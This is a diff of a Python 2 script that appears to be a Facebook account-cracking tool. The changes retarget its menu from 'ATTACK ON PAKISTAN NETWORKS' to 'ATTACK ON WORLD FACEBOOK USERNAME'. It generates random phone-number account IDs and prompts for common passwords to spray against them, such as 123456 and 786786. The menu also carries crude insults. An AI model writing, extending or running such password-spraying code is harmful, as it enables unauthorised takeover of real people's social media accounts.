@@ -7,7 +7,7 @@ import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,ge
 os.system('rm -rf .txt')
 for n in range(50000):
  
-    nmbr = random.randint(1111111, 9999999)
+    nmbr = random.randint(100000, 9999999)
     
     sys.stdout = open('.txt', 'a')
  
@@ -25,7 +25,7 @@ try:
 except ImportError:
     os.system('pip2 install mechanize')
     time.sleep(1)
-    os.system('python2 nmbr.py')
+    os.system('python2 random.py')
     
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
@@ -77,7 +77,7 @@ def menu():
 	print logo
 	print "\033[1;92mCYBER_HACKER_GLAXY_R.H.P_1.286-Wellcome"
 	print
-        print "\033[1;91mATTACK ON PAKISTAN NETWORKS"
+        print "\033[1;91mATTACK ON WORLD FACEBOOK USERNAME"
 	print "\033[1;92m[1]  MOBILINK |fighter|"
 	print "\033[1;92m[2]  TELINOR  |haters fucker|"
 	print "\033[1;92m[3]  WARID    |101.1.0.55.1|"
@@ -89,18 +89,18 @@ def menu():
 	action()
 	
 def action():	
-	bch = raw_input('\n  ENTER HERE ANY NUMBER ')
+	bch = raw_input('\n  ENTER HERE ANY random password like  ')
 	if bch =='':
 		print '[!] Fill in correctly'
 		action()
 	elif bch =="1":
 		os.system("clear")
 		print (logo)
-		print "\033[1;91mMOBILINK/JAZZ CODE HERE"		
-		print "\033[1;95m00, 01, 02, 03, 04,"
-		print "\033[1;95m05, 06, 07, 08, 09,"
+		print "\033[1;91mRANDOM PASSWORD HERE"		
+		print "\033[1;95m00, 100000, 226677, 123456, 12345678,"
+		print "\033[1;95m10000, 1234567, 123456789, 786786, Pakistan,"
 		try:
-			c = raw_input(" SELECTED CODE: ")
+			c = raw_input(" SELECTED Facebook Random password: ")
 			k="03"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
